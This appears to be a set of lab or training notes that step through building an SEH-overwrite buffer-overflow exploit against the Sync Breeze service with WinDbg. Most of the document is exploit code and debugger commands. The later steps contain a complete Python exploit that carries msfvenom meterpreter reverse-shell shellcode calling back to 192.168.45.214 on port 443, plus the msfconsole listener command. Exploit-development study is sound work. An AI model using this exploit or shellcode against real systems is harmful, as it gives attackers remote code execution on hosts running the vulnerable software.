# Procedure

1. Crash the application with PoC
2. Analyze the crash. Inital crash only overwrote the **EAX** register. Pushing **g** after this initial crash will allow the program to continue where it will overwrite the **EIP** register.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

3. Re-run the application / service and re-attach WinDbg to the process. Follow the instructions below to dump the TEB address then follow it through the next address to see all records.

{% code overflow="wrap" %}
```bash
# Obtain the TEB address
!teb
# Dump the first _EXCEPTION_REGISTRATION_RECORD structure at the memory address specified in the ExceptionList member
dt _EXCEPTION_REGISTRATION_RECORD 0185ff70
# Walk the singly-linked list in the debugger as shown in the listing below
dt _EXCEPTION_REGISTRATION_RECORD 0x0185ffcc
dt _EXCEPTION_REGISTRATION_RECORD 0x0185ffe4

```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

4. Continue application running with **g** then re-run the PoC exploit. To once again trigger an access violation.

<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

5. Once again we will walk the exception list as above. We notice that the second record has been overwritten by the malicious buffer. This means that whenever this \_EXCEPTION\_REGISTRATION\_RECORD structure is used to handle the exception, the CPU will end up calling 0x41414141, giving us control over the EIP register

```bash
!teb
dt _EXCEPTION_REGISTRATION_RECORD 01d5fe1c
dt _EXCEPTION_REGISTRATION_RECORD 0x01d5ff54
```

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

6. Check registers to see if any of them point to our buffer, in this case they don't.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

7. To better understand the SEH mechanism we can restart Sync Breeze and set a breakpoint at the ntdll!ExecuteHandler2 function to stop the execution before WinDbg intercepts the exception.

```bash
bp ntdll!ExecuteHandler2
g
```

<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

8. Let execution continue to hit the breakpoint the second time and inspect the assembly code of the executing function

<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

9. Create a pattern to find the exact offset.&#x20;

```bash
msf-pattern_create -l 1000
```

10. Update the PoC code to use the pattern offset.&#x20;

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys
from struct import pack
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B" 

  header = b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```
{% endcode %}

11. Re-run the update PoC after reseting the application and attaching to WinDbg. Run the !exchain command to see that the exception handler how now been overwritten by our unique non-repeating pattern.&#x20;

```
!exchain
```

<figure><img src="../../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

12. We now reset the environment and look for the pattern.&#x20;

```
msf-pattern_offset -l 1000 -q 33654132
```

<figure><img src="../../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

13. Modify the PoC as below to confirm the offset and rerun it.&#x20;

```python
#!/usr/bin/python
import socket
import sys
from struct import pack
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= b"\x43" * (size - len(inputBuffer))

  header = b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```

14. We can now confirm that we have the correct offset.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

15. Update the PoC to check for bad characters.&#x20;

```python
#!/usr/bin/python
import socket
import sys
from struct import pack
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= badchars
  inputBuffer+= b"\x43" * (size - len(inputBuffer))

  header = b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```

16. After running the PoC let the application try to handle the exception by running the **g** command.&#x20;

{% code overflow="wrap" %}
```bash
# Dump the bytes (db) pointed to by the second argument (EstablisherFrame) passed to the _except_handler function
dds esp L5
db 01e2ff54
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

17. The above image shows the output was corrupted right after **01** so it appears the **02** character was a bad character. After removing bad characters and repeating the process we locate all the bad characters (0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD).&#x20;
18. Use the narly extension to find available modules and their protections.&#x20;

```bash
# In WinDgb load the narly extention
.load narly
!nmod
```

<figure><img src="../../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

19. To make the exploit as portable as possible look for p/p/r instructions in the circled modules as they have no protections and are part of the application itself. libssp is the perfect candidate as it is compiled without any protections and is located in a memory location without null bytes.&#x20;
20. &#x20;Find the start end address of the module&#x20;

```bash
lm m libssp
```

<figure><img src="../../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

21. Collect all the output for all the possible op codes.&#x20;

```bash
msf-nasm_shell
pop eax
pop ebx
pop ecx
pop edx
pop esi
pop edi
pop ebp
ret
```

<figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

22. &#x20;Create a script find\_ppr.wds with the code listed below and save to the desktop.&#x20;

```
.block
{ 
    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
    { 
        .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
        {
            s-[1]b 10000000 10226000 $t0 $t1 c3
        }
    } 
}
```

23. &#x20;Execute the script with the below command.&#x20;

```
$><C:\Users\offsec\Desktop\find_ppr.wds
```

<figure><img src="../../../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

24. &#x20;Check the first address to see if it actually contains valid instructions.&#x20;

```bash
u 1015a2f0 L3
```

<figure><img src="../../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

25. &#x20;Relaunch the application and WinDbg and start the application with the g command.&#x20;
26. &#x20;We now need to update the PoC as in the code below.&#x20;

```python
#!/usr/bin/python
import socket
import sys
from struct import pack
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x43" * (size - len(inputBuffer))

  header = b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```

27. When we re-run the PoC we will again get the access violation. Inspecting the exception chain we can see that we have succesfully overwritten the exception chain.&#x20;

```
!exchain
u 1015a2f0 L3
```

<figure><img src="../../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

28. We then set a breakpoint at the p/p/r instruction sequence and resume execution which should then hit our breakpoint.&#x20;

```bash
bp 0x1015a2f0
g
```

<figure><img src="../../../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

29. We now single step trough the POP instructions and inspect the address we will be returning into

```bash
t
t
dd poi(esp) L8
t
```

<figure><img src="../../../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

30. &#x20;Inspecting the resulting assembly instructions generated by the opcodes that compose the P/P/R memory address shows that the bytes composing the P/P/R address are translated to a lock mov byte with part of our shellcode (4343) in the address so it won't work.&#x20;

```
u eip L8
dd 0x43431015 L4
```

<figure><img src="../../../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

31. Create a short jump by using the **a** command to assemble the short jump and obtain its opcodes

```
r
dds eip L4
a
jmp 0x01acff5c
u eip L1
```

<figure><img src="../../../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

32. Update the PoC as per the code below.&#x20;

```python
#!/usr/bin/python
import socket
import sys
from struct import pack
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x41" * (size - len(inputBuffer))

  header = b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")

```

33. After re-runing the updated PoC set a breakpoint at the P/P/R instruction sequence. Then let the debugger continue until it hits the breakpoint.&#x20;

```
bp 1015a2f0
g
```

<figure><img src="../../../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

34. Single step through the P/P/R instruction until we reach our short jump.&#x20;

```
t
t
t
t
t
```

<figure><img src="../../../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

35. We can confirm that if we execute the short jump that we will land in our buffer right after the SEH.&#x20;

```bash
dd 01d2ff5e - 0x06
```

<figure><img src="../../../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

36. Reviewing the memory pointed to by the instruction pointer. We can see we are very close to reaching the beginning of the stack. This won't be enough space for a reverse shell. Restart the debugging environment.&#x20;

```
dd eip L30
!teb
```

<figure><img src="../../../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

37. The PoC send 1000 bytes of data which is enough for a reverse shell so we need to search the stack for this data and see if we can find it. First we need to update the PoC to have some dummy shellcode as shown below.&#x20;

```python
#!/usr/bin/python
import socket
import sys
from struct import pack
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  shellcode = b"\x43" * 400

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode

  header = b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```

38. After running the latest PoC, we can perform a search for the NOP instructions followed by the bytes contained in our shellcode variable right after taking our short jump.&#x20;

```
bp 1015a2f0
g
t
t
t
!teb
s -b 01d4e000 01d50000 90 90 90 90 43 43 43 43 43 43 43 43
```

<figure><img src="../../../../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

39. Confirm that the entire shellcode is there by dumping it all at that address.&#x20;

```bash
dd 01d4fc70 L65
```

<figure><img src="../../../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

40. Determine the offset to our current shellcode so we can island hop using the evaluate command. First address is the one next to the start of the shellcode (Start of the NOPS) + 4.

```
? 01d4fc74 - @esp
```

<figure><img src="../../../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

41. Restart the application and WinDbg. We now need to create a jmp of size 830 bytes using nasm shell however if we do this using ESP we will get NULL bytes so we need to do this with the SP register.&#x20;

```bash
msf-nasm_shell
add sp, 0x830
jmp esp
```

<figure><img src="../../../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

42. Update the PoC to include the add assembly instruction and re-run it.&#x20;

```python
#!/usr/bin/python
import socket
import sys
from struct import pack
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  shellcode = b"\x90" * 8
  shellcode+= b"\x43" * (400 - len(shellcode))

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 2
  inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
  inputBuffer+= b"\xff\xe4" # jmp esp
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode

  header = b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```

43. Set the breakpoint, resume the program flow and single step through the add operation.&#x20;

```
!exchain
bp 1015a2f0
g
t
t
t
t
t
t
t
dd @esp L4
t
```

<figure><img src="../../../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

44. Use msfvenom to create a reverse shell excluding the bad characters found earlier.&#x20;

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.214 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode 
```
{% endcode %}

45. Modify the PoC as below with the new shellcode added.&#x20;

{% code overflow="wrap" %}
```python
#!/usr/bin/python                                                                                         
import socket                                                                                             
import sys                                                                                                
from struct import pack                                                                                   
                                                                                                          
try:                                                                                                      
  server = sys.argv[1]                                                                                    
  port = 9121                                                                                             
  size = 1000                                                                                             
                                                                                                          
  #msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.214 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode 
  shellcode = b"\x90" * 20                                                                                
  shellcode += b""                                                                                        
  shellcode += b"\xda\xce\xd9\x74\x24\xf4\x5d\xb8\xc3\x2b\xea"
  shellcode += b"\x51\x2b\xc9\xb1\x59\x31\x45\x19\x03\x45\x19"
  shellcode += b"\x83\xc5\x04\x21\xde\x16\xb9\x2a\x21\xe7\x3a"
  shellcode += b"\x54\x13\x35\xb3\x71\x37\x32\x96\x49\x33\x16"
  shellcode += b"\x1b\x22\x11\x83\x2c\x83\xdc\x8d\xb9\x99\xc8"
  shellcode += b"\xe0\x42\x6c\xc9\xaf\x81\xef\xb5\xad\xd5\xcf"
  shellcode += b"\x84\x7d\x28\x0e\xc0\xcb\x46\xff\x9c\x40\xfa"
  shellcode += b"\xef\x77\xdc\xb9\x33\x79\x32\xb6\x0b\x01\x37"
  shellcode += b"\x09\xff\xbd\x36\x5a\xaf\xb6\x61\x7a\xc4\x81"
  shellcode += b"\x89\x7b\x09\x94\x63\x0f\x91\xa6\x8c\xb9\x62"
  shellcode += b"\xfc\xf9\x3b\xa2\xcc\x3d\xfa\x85\x22\x12\xfc"
  shellcode += b"\xde\x05\x8a\x8a\x14\x76\x37\x8d\xef\x04\xe3"
  shellcode += b"\x18\xef\xaf\x60\xba\xcb\x4e\xa4\x5d\x98\x5d"
  shellcode += b"\x01\x29\xc6\x41\x94\xfe\x7d\x7d\x1d\x01\x51"
  shellcode += b"\xf7\x65\x26\x75\x53\x3d\x47\x2c\x39\x90\x78"
  shellcode += b"\x2e\xe5\x4d\xdd\x25\x04\x9b\x61\xc6\xd6\xa4"
  shellcode += b"\x3f\x50\x1a\x69\xc0\xa0\x34\xfa\xb3\x92\x9b"
  shellcode += b"\x50\x5c\x9e\x54\x7f\x9b\x97\x73\x80\x73\x1f"
  shellcode += b"\x13\x7e\x74\x5f\x3d\x45\x20\x0f\x55\x6c\x49"
  shellcode += b"\xc4\xa5\x91\x9c\x70\xac\x05\xdf\x2c\x9d\x03"
  shellcode += b"\xb7\x2e\xde\xaa\xf3\xa7\x38\xfc\x53\xe7\x94"
  shellcode += b"\xbd\x03\x47\x45\x56\x4e\x48\xba\x46\x71\x83"
  shellcode += b"\xd3\xed\x9e\x7d\x8b\x99\x07\x24\x47\x3b\xc7"
  shellcode += b"\xf3\x2d\x7b\x43\xf1\xd2\x32\xa4\x70\xc1\x23"
  shellcode += b"\xd3\x7a\x19\xb4\x76\x7a\x73\xb0\xd0\x2d\xeb"
  shellcode += b"\xba\x05\x19\xb4\x45\x60\x1a\xb3\xba\xf5\x2a"                     
  shellcode += b"\xcf\x8d\x63\x12\xa7\xf1\x63\x92\x37\xa4\xe9"
  shellcode += b"\x92\x5f\x10\x4a\xc1\x7a\x5f\x47\x76\xd7\xca"
  shellcode += b"\x68\x2e\x8b\x5d\x01\xcc\xf2\xaa\x8e\x2f\xd1"
  shellcode += b"\xa8\xc9\xcf\xa7\x86\x71\xa7\x57\x97\x81\x37"      
  shellcode += b"\x32\x17\xd2\x5f\xc9\x38\xdd\xaf\x32\x93\xb6"
  shellcode += b"\xa7\xb9\x72\x74\x56\xbd\x5e\xd8\xc6\xbe\x6d"
  shellcode += b"\xc1\xf9\xc5\x1e\xf6\xfa\x39\x37\x93\xfb\x39"
  shellcode += b"\x37\xa5\xc0\xef\x0e\xd3\x07\x2c\x35\xec\x32"
  shellcode += b"\x11\x1c\x67\x3c\x05\x5e\xa2"
  shellcode+= b"\x43" * (400 - len(shellcode))

  inputBuffer = b"\x41" * 124                                                                             
  inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)                                                         
  inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 2                                                                               
  inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830       
  inputBuffer+= b"\xff\xe4" # jmp esp                                                                     
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode                                                                                 
                                                                                                          
  header = b"\x75\x19\xba\xab"                                                                            
  header += b"\x03\x00\x00\x00"                                                                           
  header += b"\x00\x40\x00\x00"               
  header += pack('<I', len(inputBuffer))      
  header += pack('<I', len(inputBuffer))             
  header += pack('<I', inputBuffer[-1])
                                                     
  buf = header + inputBuffer                                                                              
                                                     
  print("Sending evil buffer...")                                                                         
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                                   
  s.connect((server, port))                                                                               
  s.send(buf)            
  s.close()                                          
                                                     
  print("Done!")               
                                                     
except socket.error:                    
  print("Could not connect!")
```
{% endcode %}

46. Setup a meterpreter listener

{% code overflow="wrap" %}
```bash
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.45.214; set LPORT 443; exploit"
```
{% endcode %}

